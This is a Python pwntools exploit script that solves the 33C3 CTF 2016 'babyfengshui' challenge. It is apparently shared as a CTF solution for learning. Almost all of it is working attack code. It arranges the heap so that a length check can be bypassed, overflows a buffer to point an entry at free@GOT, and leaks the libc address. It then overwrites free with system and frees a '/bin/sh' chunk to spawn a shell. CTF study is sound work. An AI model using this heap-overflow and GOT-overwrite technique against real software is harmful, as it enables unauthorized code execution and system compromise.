#
# 33C3 CTF 2016 pwn babyfengshui
#
# Kichang Yang original version.
#

from pwn import *
import re

b = ELF('./babyfengshui')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

r = process('./babyfengshui')

def hex_dump(s):
    return ":".join("{:02x}".format(ord(c)) for c in s)

def recv_all():
    b = ""
    last_recv = True
    while last_recv:
        try:
            last_recv = r.recv(1024)
        except socket.timeout:
            last_recv = None
        if last_recv:
            b += last_recv
    return b

def snd(s):
    r.send(s)

#
# p = malloc(size_desc)
# p2 = malloc(128)                  // [ptr][name]
# *p2 = p
# fgets((char *)p2 + 4, 124)        // name
#
def add(size_desc, name, len_desc, desc):
    snd('0\n')
    r.recvuntil('size of description: ')
    snd(str(size_desc) + '\n')
    r.recvuntil('name: ')
    snd(name + '\n')
    r.recvuntil('text length: ')
    snd(str(len_desc) + '\n')
    r.recvuntil('text: ')
    snd(desc + '\n')
    r.recvuntil('Action: ')

#
# free(*(void **)g_player_tbl[idx])
# free(g_player_tbl[idx])
#
def delete(idx):
    snd('1\n')
    r.recvuntil('index: ')
    snd(str(idx) + '\n')
    r.recvuntil('Action: ')

#
# In order to bypass the security check below,
# we have to place 'p2' sufficiently farther after 'p'
#
# if ( p + len_text >= p2 - 4 ) error();
#
# fgets(*(char **)g_player_tbl[idx], len_text + 1)
#
def update(idx, len_desc, desc):
    snd('3\n')
    r.recvuntil('index: ')
    snd(str(idx) + '\n')
    r.recvuntil('text length: ')
    snd(str(len_desc) + '\n')
    r.recvuntil('text: ')
    snd(desc + '\n')
    r.recvuntil('Action: ')

def display(idx):
    snd('2\n')
    r.recvuntil('index: ')
    snd(str(idx) + '\n')
    resp = recv_all()
    print resp
    desc = re.findall(r"description: (.+)", resp)[0]
    return desc

if __name__ == "__main__":

    r.recvuntil('Action: ')

    r.settimeout(0.5)

    #
    # Objective:
    #
    # *g_player_tbl[a1] = GOT of free
    #

    add(24, 'AAAA', 8, '/bin/sh\x00')           # chunk 0
    add(24, 'CCCC', 4, 'DDDD')                  # chunk 1
    add(24, 'EEEE', 4, 'FFFF')                  # chunk 2
    raw_input('after adding items...')
    #delete(0)
    delete(1)
    #delete(2)
    raw_input('after deleting the in-between item...')

    add(128, 'GGGG', 4, 'HHHH')                 # chunk 3
    raw_input('after adding 1 item...')

    #
    # Memory layout (heap fengshui)
    #
    # [0-desc] [0-name] [1-desc] [1-name] [2-desc] [2-name]               
    #
    # [0-desc] [0-name]                   [2-desc] [2-name]               
    #
    # [0-desc] [0-name] [    3-desc     ] [2-desc] [2-name] [3-name]
    #
    #                    ----------------------------->      
    #                        we can overwrite the first 4 bytes of [chunk 2-name]
    #                        while satisfying (p + len_text < p2 - 4)           
    #

    update(3, 168+4, 'X'*168+p32(b.got['free'])) # now, we can bypass the check, overflow heap and overwrite [ptr]
    
    l = display(2)
    print hex_dump(l)
    l = l[0:4]
    l = u32(l)
    log.info('free@GOT: 0x%x' % l)
    
    libc_base = l - libc.symbols['free']
    log.info('libc: 0x%x' % libc_base)
    system_addr = libc_base + libc.symbols['system']

    update(2, 4, p32(system_addr))

    raw_input('after overwriting free@GOT...')

    delete(0) # delete() will call free()
    
    r.interactive()
